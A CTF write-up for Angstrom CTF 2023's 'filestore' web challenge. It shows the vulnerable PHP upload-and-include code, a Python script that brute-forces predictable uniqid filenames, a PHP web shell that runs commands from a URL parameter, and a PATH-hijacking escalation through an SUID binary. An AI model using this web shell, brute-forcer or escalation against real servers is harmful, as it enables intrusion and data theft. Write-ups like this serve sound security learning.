---
title: Filestore Writeup - Angstrom CTF 2023
date: 2023-04-27
description: A writeup for the filestore challenge from Angstrom CTF 2023
tags: [writeups, ctfs]
---

This past week I played Angstrom CTF with `.;,;.` and we got 2nd place in the High School division! Good job to my friends on the 1st place team `View Source` and 3rd place team `Les Amateurs`! It was one of the more fun CTFs I've done in a while (although imo last year's was better lol).

# The Challenge
{{< zoom-img src="img/chall.png" >}}

When going to the linked page, we see the source of the index.php file.

```php
if($_SERVER['REQUEST_METHOD'] == "POST"){
    if ($_FILES["f"]["size"] > 1000) {
        echo "file too large";
        return;
    }

    $i = uniqid();

    if (empty($_FILES["f"])){
        return;
    }

    if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"])){
        echo "upload success";
    } else {
        echo "upload error";
    }
} else {
    if (isset($_GET["f"])) {
        include "./uploads/" . $_GET["f"];
    }

    highlight_file("index.php");

    // this doesn't work, so I'm commenting it out 😛
    // system("/list_uploads");
}
```

There's two main functionalities in this file. Being able to upload a file to the server and being able to read files on the server.

In the source of the challenge theres also two executables. `list_uploads` which attempts to list the contents of the uploads folder, and `make_abyss_entry` which creates a new directory in the `/abyss` folder. Also in the source is a Dockerfile which tells us the location of the flag and different permissions that programs have.

```docker
FROM php:8.1.18-apache-bullseye

RUN groupadd -r admin && useradd -r -g admin admin
RUN groupadd -r ctf && useradd -r -g ctf ctf

RUN sed -i "s/Listen 80/Listen 8080/" /etc/apache2/ports.conf

RUN chmod -R 755 /etc/apache2 &&\
    chmod -R 755 /var/www/

COPY flag.txt /flag.txt
RUN chown admin:admin /flag.txt &&\
    chmod 440 /flag.txt

COPY make_abyss_entry /make_abyss_entry
RUN chown root:root /make_abyss_entry &&\
    chmod 111 /make_abyss_entry &&\
    chmod g+s /make_abyss_entry

COPY list_uploads /list_uploads
RUN chown admin:admin /list_uploads &&\
    chmod 111 /list_uploads &&\
    chmod g+s /list_uploads

COPY src /var/www/html

RUN mkdir /abyss &&\
    chown -R root:root /abyss &&\
    chmod -R 331 /abyss

RUN chown -R root:root /var/www/html &&\
    chmod -R 555 /var/www/html

RUN rm -rf /var/www/html/uploads

RUn mkdir /var/www/html/uploads &&\
    chmod -R 333 /var/www/html/uploads

RUN rm -f /bin/chmod /usr/bin/chmod /bin/chown /usr/bin/chown

USER ctf

EXPOSE 8080
```

The most important things here are the following:
- The flag is stored at `/flag.txt`
- `list_uploads` has a SUID to run as admin
- 'make_abyss_entry' has a SUID to run as root
- The `/var/www/html/uploads` folder is owned by root

Because the uploads folder is owned by root and it only has WX permissions, the `list_uploads` program can't actually view the contents of the folder. That's also the reason for the comment in the PHP file.

## Uploading files

The upload part of the code seems pretty safe at first. The filename gets natively sanitized by PHP so no path traversal, and some sort of "unique" ID is generated and is used in the filename for our uploaded file, making it look impossible to actually ever view the contents by requesting it. However, the `uniqid` PHP function doesn't exactly generate a random unguessable string. According to the PHP manual, the `uniqid` function "Gets a prefixed unique identifier based on the current time in microseconds." Meaning if we can guess the time at the call of the function, we can recreate the filename and view its contents.

## Reading files

When specifying a filename with url param `f`, the file gets "included" on the page. At first when I saw this, I thought of path traversal and began trying different things, although eventually giving up on that idea once I wasn't able to find anything useful. I eventually noticed that the `include` keyword in PHP can render another PHP file on the page. This started to give me the idea for the initial attack vector.

# Our plan

The path we decided on to read the flag was:
- Upload the file to the server and find it using brute-force
- Including the file will help us achieve RCE by taking advantage of PHP's `system` function
- Privilege escalate somehow in order to read `/flag.txt`

## First step: Privelege Escalation?

It might be a bit confusing as to why we decided to tackle privilege escalation first, but to us it made since we already knew how to achieve LFI and RCE, we just weren't sure what to do next and if we were even on the right track. The obvious first place to check is the SUID binaries on the system. The first one, `list_uploads` would run the LIBC `system` function with the argument `ls /var/www/html/uploads`. However, the program isn't able to read anything from there because of insufficient permissions. The next one, `make_abyss_entry` would simply create a directory in the `/abyss` directory and give us the name of the created folder. I assume this was supposed to be used as a secure way to hide your solution from others but we decided to ignore it (ignoring it may have unintentionally helped other teams that found our tmp folder, oops).

An idea that came to me was that because `list_uploads` would simply run a system command instead of using LIBC functions to achieve the same thing, we could pass in our own `PATH` environment variable to trick the program into running our `ls` instead of the one in `/bin/`. The easiest way I found to use this was to upload a very short C script that would call `cat /flag.txt` and compile it using GCC. Testing this on a local Docker container proved this method to work.

The following was my list of commands to read the flag:

```bash
mktemp -d 
echo 'int main(){ system("cat /flag.txt"); }' > /tmp/tmp.KoLYWkwLcn/ls.c
gcc /tmp/tmp.KoLYWkwLcn/ls.c -o /tmp/tmp.KoLYWkwLcn/ls
PATH=/tmp/tmp.KoLYWkwLcn/:/bin/ /list_uploads
```

## Second step: LFI

The second (and actually for us the hardest) step was achieving LFI. In order to do so we would have to send our file to the server, get the time we sent it, and start brute-forcing the output of the `uniqid` function. Thing is, it would take around 30k requests to the server and our machines were only able to get 3 requests per second. Obviously this wasn't going to be good enough, so one of our teammates (ty uanirudhx) suggested running a droplet near the server so we can make requests faster. Doing this method we were able to get 10 requests per second, meaning it would take about 50 minutes max. During that time I was making a script that would go at 400 requests per second but I wasn't able to get it fully working in time before we eventually achievied LFI. Heres the script we used for it (ty flocto).

```python
import requests
from hashlib import sha256
import datetime
from tqdm import tqdm

def uniqid(time):
    head = int(time)
    tail = round((time - head)*1000000)

    uid = '%08x%05x' % (head, tail)
    return uid

def from_id(uid):
    head = int(uid[:8], 16)
    tail = int(uid[8:], 16)

    time = head + tail/1000000
    return round(time, 6)

def check_elapsed(filename, contents):
    r = requests.post(url, files={"f": (filename, contents)})
    return r.elapsed.total_seconds()

# url = '<redacted ngrok url>'
url = 'https://filestore.web.actf.co/'
file = 'webshell.php'
with open(file, "rb") as f:
    contents = f.read()

# times = []
# for _ in range(25):
#     times.append(check_elapsed(file, contents))
# avg_elapsed = sum(times) / len(times) * 1000000
# print("average elapsed is", avg_elapsed)
# print("min elapsed is", min(times) * 1000000)
# print("max elapsed is", max(times) * 1000000)

start = datetime.datetime.now().timestamp()
r = requests.post(url, files={"f": (file, contents)})
end = start + r.elapsed.total_seconds()
diff = (end - start) * 1000000

# url = 'http://localhost:8080/'
# url = 'https://filestore.web.actf.co/'

print("start", start)
print("end", end)
print("diff", diff)
# exit()

time = start + diff * 4 / 1_000_000 / 5 # midway
to_end = end - time
to_end *= 1_000_000
to_end = round(to_end + 30000) # just some extra to be safe
uid = uniqid(time)
print("uid", uid)

for c in tqdm(range(to_end)):
    uid = uniqid(time)
    path = uid + '_' + sha256(file.encode()).hexdigest() + '_' + file

    # print(path)
    r = requests.get(url + "?f=" + path)
    if 'QWERTY' in r.text:
        print(r.text)
        print(time)
        print(path)
        break

    time += 1 / 1000000
print(path)


print("FOUND IN", c)
```

## Third (and final) step: RCE

RCE was simple, we could simply include PHP code that called a series of `system` functions and we would be done. However one of our teammates (ty flocto) decided to make life a bit easier by using a PHP script that would take our input then run the system command on our input.

```html
<html> 
<body> QWERTY
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="TEXT" name="f" id="f" value=<?php echo $_GET['f']; ?>>
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

# Conclusion

Following through with all these steps led us to the flag `actf{w4tch_y0ur_p4th_724248b559281824}`.

Thanks to flocto ([@fl0ct0](https://twitter.com/fl0ct0)) and uanirudhx (idk their twitter) for helping with this challenge!
